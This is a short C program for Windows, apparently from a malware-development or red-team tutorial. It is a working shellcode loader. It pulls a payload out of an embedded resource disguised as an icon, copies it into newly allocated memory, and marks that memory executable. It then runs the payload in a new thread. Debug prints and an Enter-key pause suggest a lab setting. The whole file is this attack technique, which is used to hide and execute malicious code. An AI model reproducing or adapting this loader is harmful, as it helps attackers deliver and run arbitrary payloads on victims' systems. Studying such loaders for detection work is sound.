#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include "rsrc.h"

int main(void)
{
	void * alloc_mem;
	BOOL retval;
	DWORD oldprotect=0;
	HANDLE threadHandle;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * scPayload;
	unsigned int scLength;
	
	res = FindResource(NULL, MAKEINTRESOURCE(MY_ICON), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	scPayload = (char *) LockResource(resHandle);
	scLength = SizeofResource(NULL, res);
	
	//memory allocation
	alloc_mem = VirtualAlloc(0, scLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "shellcodePayload addr", (void *)scPayload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);
	
	//copy shell
	RtlMoveMemory(alloc_mem, scPayload, scLength);
	
	retval = VirtualProtect(alloc_mem, scLength, PAGE_EXECUTE_READ, &oldprotect);
	printf("\nPress Enter to Create Thread!\n");
	getchar();
	
	if(retval!=0)
	{
		threadHandle = CreateThread(0,0, (LPTHREAD_START_ROUTINE) alloc_mem,0,0,0);
		WaitForSingleObject(threadHandle, -1);
	}
	
}
